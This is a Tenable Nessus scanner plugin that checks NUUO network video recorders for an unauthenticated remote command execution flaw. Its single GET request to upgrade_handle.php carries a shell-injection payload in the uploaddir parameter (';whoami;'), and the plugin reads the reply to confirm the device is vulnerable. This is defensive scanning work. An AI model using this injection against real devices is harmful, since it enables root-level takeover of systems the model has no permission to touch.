#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(103928);
  script_version("1.4");
  script_cvs_date("Date: 2018/06/14 12:21:48");


  script_name(english:"NUUO NVR Web Interface RCE");
  script_summary(english:"Sends an HTTP GET request");

  script_set_attribute(attribute:"synopsis", value:
"The remote network video recorder doesn't properly sanitize some user
input.");
  script_set_attribute(attribute:"description", value:
"The remote network video recorder doesn't properly sanitize some user
input which can allow a remote unauthenticated user to execute
commands as root.");
  # https://security.szurek.pl/netgear-ready-nas-surveillance-14316-unauthenticated-rce.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bc69e1ca");
  script_set_attribute(attribute:"solution", value:
"Apply the latest firmware update. It is unclear if NUUO has
addressed this vulnerability in all products.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/09/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/08/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/10/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("nuuo_netgear_www_video_detect.nbin");
  script_require_keys("installed_sw/NUUO NVR");
  script_require_ports("Services/www");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = 'NUUO NVR';
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE, php:TRUE);
install = get_single_install(app_name:appname, port:port);

uri = '/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27';
res = http_send_recv3(
  method:'GET',
  item:uri,
  port:port,
  exit_on_fail:FALSE);

# the patch makes upgrade_handle.php unreachable becasue
# it is behind auth. Oddly, the patch responds with a 302
# instead of 401... I'm just going to look for a 200
if (empty_or_null(res) || "200 OK" >!< res[0])
{
  audit(AUDIT_HOST_NOT, "an affected NUUO NVR device");
}

# the patch also introduces logic that "ensures" that
# uploaddir is a well formed URL. Our request should
# fail this check.
if ("Not a valid URL." >< res[2])
{
  audit(AUDIT_HOST_NOT, "an affected NUUO NVR device");
}

# finally, on success we *should* get a response
# about everything going ok. To be extra careful
# I'm going to require that text to be present
if ("Modify upload directory ok" >!< res[2])
{
  audit(AUDIT_HOST_NOT, "an affected NUUO NVR device");
}

var report = 
  '\n' + "Nessus was able to send a GET request to the" +
  '\n' + "following URL to execute an OS command:" +
  '\n' +
  '\n' + build_url(qs:uri, port:port) +
  '\n';
security_report_v4(severity:SECURITY_HOLE, port:port, extra:report);
exit(0);
